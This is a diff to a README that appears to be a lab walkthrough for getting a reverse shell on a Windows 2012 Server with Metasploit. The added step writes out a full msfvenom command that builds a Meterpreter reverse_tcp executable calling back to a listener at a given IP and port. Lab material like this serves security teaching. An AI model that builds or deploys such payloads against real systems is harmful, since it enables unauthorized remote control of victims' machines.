@@ -14,6 +14,13 @@ This is a demonstration of obtaining a reverse shell on a Windows 2012 Server. T
   -5 - once this has been completed, you may run : run -j or exploit -j at the msf prompt. This will create a persistent listener that will exit once you tell it to, it a disconnect from the client(victim). After doing so, you should see the following screen : <br>
   
   ![image](https://user-images.githubusercontent.com/101802030/225851486-2fa0062f-5b31-435c-8b7d-9b492d37a588.png)
+  
+  # Step 2 : Create an exploit using msfvenom. To do so, you run the following command -
+  -1 - sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=172.16.0.150 LPORT=8888 -f exe -o ~/Downloads/my_new_exploit.exe
+  And you should see the following output :
+  
+  ![image](https://user-images.githubusercontent.com/101802030/225945823-7e83ae7e-f211-4359-8b63-a72db0f21506.png)
+
 
 
   
